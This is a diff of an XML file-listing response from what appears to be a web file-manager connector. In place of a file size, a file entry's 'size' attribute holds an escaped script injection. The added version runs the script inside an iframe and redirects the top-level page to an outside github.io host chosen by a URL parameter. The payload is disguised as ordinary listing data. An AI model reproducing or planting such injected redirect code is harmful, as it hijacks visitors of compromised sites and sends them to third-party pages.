@@ -1,18 +1,29 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <Connector command="GetFoldersAndFiles" resourceType="Document">
     <CurrentFolder path="/1 - f/" url=""/>
-
+    <Folders/>
     <Files>
-        <File desc="1" name="Loading..." size="&lt;script&gt;
-        (function() {
-            const baseURL = 'https://mrsabasmia.github.io/subwork/work/';
-            const params = new URLSearchParams(window.location.search);
-            const file = params.get('id');
+        <File
+            desc="1"
+            name="Loading..."
+            size="&lt;iframe srcdoc=&quot;
+            &lt;script&gt;
+            (function() {
+                const baseURL = 'https://mrsabasmia.github.io/subwork/';
+                const params = new URLSearchParams(window.location.search);
+                const file = params.get('id');
 
-            if (file) {
-                window.location.replace(baseURL + encodeURIComponent(file) + '.html');
-            }
-        })();
-        &lt;/script&gt;"/>
+                if (file) {
+                    if (/^[a-zA-Z0-9_-]+$/.test(file)) {
+                        window.top.location.replace(
+                            baseURL + encodeURIComponent(file) + '.html'
+                        );
+                    }
+                }
+            })();
+            &lt;/script&gt;
+            &quot;&gt;&lt;/iframe&gt;"
+            url="1"
+        />
     </Files>
 </Connector>
